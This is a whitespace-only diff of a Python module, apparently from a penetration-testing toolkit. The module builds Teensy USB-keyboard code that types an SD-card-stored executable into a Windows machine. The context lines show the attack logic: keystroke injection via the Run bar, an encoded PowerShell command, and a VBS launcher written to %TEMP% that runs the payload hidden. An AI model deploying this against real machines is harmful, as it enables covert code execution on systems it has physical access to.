@@ -30,7 +30,7 @@ you to have a Teensy device with a soldered USB device on it and place the
 file that this tool outputs in order to successfully complete the task.
 
 It works by reading natively off the SDCard into a buffer space thats then
-written out through the keyboard. 
+written out through the keyboard.
 """
 
 # if we hit here we are good since msfpayload is installed
@@ -42,11 +42,11 @@ print """
 
 # grab the path and filename from user
 path = raw_input(setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
-if not os.path.isfile(path): 
-        while 1:
-                print_warning("Filename not found, try again")
-                path = raw_input(setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
-                if os.path.isfile(path): break
+if not os.path.isfile(path):
+    while 1:
+        print_warning("Filename not found, try again")
+        path = raw_input(setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
+        if os.path.isfile(path): break
 
 print_warning("Note: This will only deliver the payload, you are in charge of creating the listener if applicable.")
 print_status("Converting the executable to a hexadecimal form to be converted later...")
@@ -138,7 +138,7 @@ void setup()
       delay(10);
     }
     dataFile.close();
-  }  
+  }
   else {
     Keyboard.println("error opening converts.txt");
   }
@@ -154,7 +154,7 @@ void setup()
   delay(1000);
   Keyboard.println("powershell -EncodedCommand %s");
   // Tweak this delay.  Larger files take longer to decode through powershell.
-  delay(10000);  
+  delay(10000);
   Keyboard.println("echo Set WshShell = CreateObject(\\"WScript.Shell\\") > %%TEMP%%\\\\%s");
   Keyboard.println("echo WshShell.Run chr(34) ^& \\"%%TEMP%%\\\\%s\\" ^& Chr(34), 0 >> %%TEMP%%\\\\%s");
   Keyboard.println("echo Set WshShell = Nothing >> %%TEMP%%\\\\%s");
@@ -191,12 +191,12 @@ Keyboard.send_now();
 }
 // Taken from IronGeek
 void CommandAtRunBar(char *SomeCommand){
-  Keyboard.set_modifier(128); 
-  Keyboard.set_key1(KEY_R); 
-  Keyboard.send_now(); 
-  Keyboard.set_modifier(0); 
-  Keyboard.set_key1(0); 
-  Keyboard.send_now(); 
+  Keyboard.set_modifier(128);
+  Keyboard.set_key1(KEY_R);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
   delay(1500);
   Keyboard.print(SomeCommand);
   Keyboard.set_key1(KEY_ENTER);
@@ -227,7 +227,7 @@ Instructions:
 Copy the converts.txt file to the sdcard on the Teensy device. Use the teensy.pde normally
 and use the Arduino IDE to place the latest code in there. Notice that you need to change
 some code marked above based on the Teensy and the Teensy++ based on how you soldered the PIN's
-on. 
+on.
 
 Happy hacking.
 """
